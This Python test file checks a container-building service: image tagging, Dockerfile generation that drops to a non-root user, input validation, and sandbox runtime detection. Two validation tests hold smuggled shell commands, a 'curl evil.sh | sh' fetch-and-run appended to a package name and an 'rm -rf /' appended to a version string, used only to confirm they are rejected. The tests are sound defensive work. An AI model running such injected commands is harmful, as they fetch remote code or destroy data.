"""Shared container machinery: image tags, dockerfile generation, build."""
import pytest

from app.services.container_runtime import (
    IMAGE_SCHEMA_VERSION,
    _validate_packages,
    _validate_python_version,
    ensure_docker_image,
    image_tag_for,
)
from tests.sandbox_fakes import FakeDockerClient


def test_image_tag_includes_schema_version():
    payload = {"id": "env1", "packages_hash": "abc123"}
    tag = image_tag_for(payload)
    assert tag == f"noodle-env:env1-abc123-{IMAGE_SCHEMA_VERSION}"


def test_image_tag_defaults():
    assert image_tag_for({}) == f"noodle-env:default-latest-{IMAGE_SCHEMA_VERSION}"


def test_build_skipped_when_cached():
    client = FakeDockerClient()
    client.images.existing.add("sometag")
    ensure_docker_image(client, "sometag", {"python_version": "3.12", "packages": []})
    assert client.images.built == []


def test_build_dockerfile_runs_as_nonroot():
    captured = {}
    client = FakeDockerClient()
    orig = client.images.build

    def capture(fileobj=None, tag="", rm=True):
        captured["dockerfile"] = fileobj.read().decode()
        return orig(fileobj=fileobj, tag=tag, rm=rm)

    client.images.build = capture
    ensure_docker_image(
        client, "t1", {"python_version": "3.12", "packages": ["requests==2.31.0"]}
    )
    df = captured["dockerfile"]
    assert "USER noodle" in df
    assert "useradd" in df
    assert "requests==2.31.0" in df
    # install happens BEFORE dropping privileges
    assert df.index("uv pip install") < df.index("USER noodle")


def test_package_validation_blocks_shell_metacharacters():
    with pytest.raises(ValueError):
        _validate_packages(["requests; curl evil.sh | sh"])
    assert _validate_packages(["numpy>=1.26,<2", " ", "pandas[excel]==2.2.0"]) == [
        "numpy>=1.26,<2",
        "pandas[excel]==2.2.0",
    ]


def test_python_version_validation():
    assert _validate_python_version("3.12") == "3.12"
    with pytest.raises(ValueError):
        _validate_python_version("3.12; rm -rf /")


# --- isolation runtime probe -------------------------------------------------

from app.services.container_runtime import detect_runtime  # noqa: E402


def test_probe_auto_prefers_strongest():
    assert detect_runtime(FakeDockerClient(runtimes=("runc",)), "auto") == "runc"
    assert detect_runtime(FakeDockerClient(runtimes=("runc", "runsc")), "auto") == "runsc"
    assert (
        detect_runtime(FakeDockerClient(runtimes=("runc", "runsc", "kata")), "auto")
        == "kata"
    )


def test_probe_explicit_runtime_must_exist():
    assert detect_runtime(FakeDockerClient(runtimes=("runc", "runsc")), "runsc") == "runsc"
    with pytest.raises(RuntimeError, match="runsc"):
        detect_runtime(FakeDockerClient(runtimes=("runc",)), "runsc")


def test_probe_runc_always_available():
    """Docker Desktop daemons sometimes omit Runtimes from info()."""

    class NoRuntimesClient(FakeDockerClient):
        def info(self):
            return {}

    assert detect_runtime(NoRuntimesClient(), "auto") == "runc"
    assert detect_runtime(NoRuntimesClient(), "runc") == "runc"


def test_probe_invalid_value():
    with pytest.raises(ValueError, match="sandbox_runtime"):
        detect_runtime(FakeDockerClient(), "qemu")
